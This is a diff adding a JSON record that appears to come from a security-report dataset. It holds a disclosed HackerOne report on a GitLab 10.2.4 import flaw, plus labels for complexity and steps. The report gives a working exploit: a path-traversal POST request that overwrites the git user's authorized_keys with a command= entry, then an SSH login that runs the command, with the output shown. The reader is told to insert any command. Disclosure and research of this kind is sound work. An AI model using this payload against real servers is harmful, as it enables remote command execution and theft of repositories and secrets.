@@ -1,0 +1,49 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "jobert ",
+  "title": "Command injection by overwriting authorized_keys file through GitLab import",
+  "content": "\nThe Projects::GitlabProjectsImportService contains a vulnerability that allows an attacker to write files to arbitrary directories on the server. This leads to an arbitrary command execution vulnerability by overwriting the authorized_keys file. To reproduce, sign in to a GitLab instance that has GitLab import enabled. This is enabled by default, so I'd assume that this vulnerability applies to most GitLab instances. I've installed my GitLab instance through Omnibus.\nNext up, intercept your network traffic and upload a GitLab import file. Observe the following request being made to the server:\nRequest\nCode 437 Bytes\n1POST /import/gitlab_project HTTP/1.1\n2Host: gitlab-instance\n3...\n4\n5------WebKitFormBoundaryA0TxBpQRLhL4lJQN\n6Content-Disposition: form-data; name=\"path\"\n7test\n8------WebKitFormBoundaryA0TxBpQRLhL4lJQN\n9Content-Disposition: form-data; name=\"namespace_id\"\n10\n111\n12------WebKitFormBoundaryA0TxBpQRLhL4lJQN\n13Content-Disposition: form-data; name=\"file\"; filename=\"2017-12-17_02-20-093_root_test_export.tar.gz\"\n14Content-Type: application/x-gzip\n15\n16<file data>\nNow take a closer look at the code that is being executed when this endpoint is hit:\napp/services/projects/gitlab_project_import_service.rb\nCode 753 Bytes\n1# This service is an adapter used to for the GitLab Import feature, and\n2# creating a project from a template.\n3# The latter will under the hood just import an archive supplied by GitLab.\n4module Projects\n5  class GitlabProjectsImportService\n6    # ...\n7\n8    def execute\n9      FileUtils.mkdir_p(File.dirname(import_upload_path))\n10      FileUtils.copy_entry(file.path, import_upload_path)\n11\n12      Gitlab::ImportExport::ProjectCreator.new(params[:namespace_id],\n13                                               current_user,\n14                                               import_upload_path,\n15                                               params[:path]).execute\n16    end\n17\n18    # ...\n19\n20    def tmp_filename\n21      \"#{SecureRandom.hex}_#{params[:path]}\"\n22    end\n23  end\n24end\nThe import_upload_path will take the unsanitized params[:path] and append it to the GitLab uploads directory. This means that directories can be traversed in the path parameter. Another observation is that the file contents of the file aren't verified. This means that it may contain any data at that point.\nMy first though was to abuse this vulnerability to exploit a second-order remote code execution by writing an ERB template to the Rails views directory. However, that didn't work because of the file permissions of the GitLab Rails directory. I started looking for other files. I noticed that the uploads directory was writable for the git user. I took a closer look at the /var/opt/gitlab/ directory and noticed the .ssh/authorized_keys directory. This file was writable for the git user, and thus, could be overwritten. This file can specify a command when an SSH connection is made. Now, going back to the original HTTP request, here's the updated request to overwrite the file:\nCode 1.31 KiB\n1POST /import/gitlab_project HTTP/1.1\n2Host: gitlab-instance\n3...\n4\n5------WebKitFormBoundaryA0TxBpQRLhL4lJQN\n6Content-Disposition: form-data; name=\"path\"\n7\n8new-test/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys\n9------WebKitFormBoundaryA0TxBpQRLhL4lJQN\n10Content-Disposition: form-data; name=\"namespace_id\"\n11\n121\n13------WebKitFormBoundaryA0TxBpQRLhL4lJQN\n14Content-Disposition: form-data; name=\"file\"; filename=\"2017-12-17_02-20-093_root_test_export.tar.gz\"\n15Content-Type: application/x-gzip\n16\n17command=\"ls -lash\",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxc6GwCNoYCygtTXvoBpn1ACoF4hxhQviNa/0fm3LGGnEWLszswgw4QcaxXYiRumKjBv77eJT2/VbJylZX0uL6D/1/hubTmnp2A1QQJLk1rMvaUGlR8DeQpIcF1T61g3y4lEw5yhaaHRqRLiMpGammQhu0PO6PTDbKlGH+HxA0u8ku/L+lJXncNtpupw3qTDaAt8dgamKAU8RSZRyANK2BVYVj1W376OQFglHIeQW62LsNNgvr9Oe/Ze1YeQqvHO/lv0AeWYdLgjBJOiC5acBFexDBCr4odeSqkDPmKCMI28Mw28hC8fJIHh3vFqXjvlPtkuhDmdap4x+8gUxP77DWoMGw6LY8cuce+sSWY0teawMFW8Dm2R0Fr2iHzpCT8IpKgVHQ24BnmPGWjtWHxDX2DSzdE3GC6dWStVXud3iprgipM2SOxFkwHIISzLybjT1u/fK1sO4IW6E2T1cgSYQd7I2KhNJsgW57GljefD4cmhlwR39ZXZ1GtDCoUxtwZF3Qpr6XaSQ4nL71Wq+Y+v2TGeJzI9HXHRUSP2gZh/BI5kUdeUKkeylhLLouCqII5MlIlMmklXFOOPXoip/KCO36fYRZ1YAhxJ0J1JGX7ws4BnMMKHAHp+YOtRpAfGXcA+yEdMx50PRvXydqNeivfvDlY2JXRRIKUA03O9GoWmPLpQ==\n18------WebKitFormBoundaryA0TxBpQRLhL4lJQN--\nIn the request, replace my public SSH key with your own and replace ls -lash with whatever command you want to execute. When the request is sent to the server, a 302 Found will be returned. This is caused by a validation error that is returned because the project name contains invalid characters. Because the files aren't cleaned up, our exploit persists.\nResponse\nCode 190 Bytes\n1HTTP/1.1 302 Found\n2Server: nginx\n3...\n4Location: http:/gitlab-instance/import/gitlab_project/new?namespace_id=1&path=new-test/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys\n5...\nNow, to execute the command, run ssh git@gitlab-instance:\nCode 1.66 KiB\n1$ ssh git@gitlab-instance\n2PTY allocation request failed on channel 0\n3total 84K\n44.0K drwxr-xr-x 18 root              root       4.0K Dec 15 04:33 .\n54.0K drwxr-xr-x  3 root              root       4.0K Dec 15 04:32 ..\n64.0K drwx------  2 git               root       4.0K Dec 15 04:32 backups\n74.0K -rw-------  1 root              root         38 Dec 15 04:33 bootstrapped\n84.0K drwx------  2 git               root       4.0K Dec 17 02:28 gitaly\n94.0K -rw-r--r--  1 git               git         292 Dec 15 04:32 .gitconfig\n104.0K drwx------  3 git               root       4.0K Dec 15 04:32 git-data\n114.0K drwxr-xr-x  3 git               root       4.0K Dec 15 04:32 gitlab-ci\n124.0K drwxr-xr-x  2 git               root       4.0K Dec 15 04:33 gitlab-monitor\n134.0K drwxr-xr-x  9 git               root       4.0K Dec 15 04:33 gitlab-rails\n144.0K drwx------  2 git               root       4.0K Dec 15 04:32 gitlab-shell\n154.0K drwxr-x---  2 git               gitlab-www 4.0K Dec 17 02:28 gitlab-workhorse\n164.0K drwx------  3 root              root       4.0K Dec 17 02:38 logrotate\n174.0K drwxr-x---  9 root              gitlab-www 4.0K Dec 17 02:28 nginx\n184.0K drwxr-xr-x  3 root              root       4.0K Dec 15 04:33 node-exporter\n194.0K drwx------  2 gitlab-psql       root       4.0K Dec 15 04:34 postgres-exporter\n204.0K drwxr-xr-x  3 gitlab-psql       root       4.0K Dec 17 02:28 postgresql\n214.0K drwxr-x---  3 gitlab-prometheus root       4.0K Dec 15 04:33 prometheus\n224.0K drwxr-x---  2 gitlab-redis      git        4.0K Dec 17 02:43 redis\n234.0K drwx------  2 git               git        4.0K Dec 17 02:44 .ssh\n244.0K -rw-r--r--  1 root              root         40 Dec 15 04:32 trusted-certs-directory-hash\nThis has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).\nImpact\nAn attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.\n\n",
+  "severity": [
+    9.9,
+    null
+  ],
+  "bounty": 2000,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1524810000,
+  "report_url": "https://hackerone.com/reports/298873",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Sign in to a GitLab instance with GitLab import enabled."
+    ],
+    [
+      2,
+      "Intercept network traffic and upload a GitLab import file with a malicious path parameter to traverse directories and overwrite the authorized_keys file."
+    ],
+    [
+      3,
+      "Use the overwritten authorized_keys file to execute arbitrary commands via SSH."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an attacker to execute arbitrary system commands on the server by exploiting a directory traversal in the GitLab import feature to overwrite the authorized_keys file, leading to remote code execution.",
+  "reason": "The attack involves multiple components including directory traversal, file upload manipulation, and SSH command execution. It requires understanding of GitLab's file handling and SSH key management, but the steps are somewhat linear once the initial vulnerability is identified.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves directory traversal and file overwrite in the GitLab import functionality, which is not directly related to authentication or authorization bypass through user session or resource ID manipulation. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, but this vulnerability exploits a file handling flaw in the import process.",
+    "is_detectable": false
+  }
+}
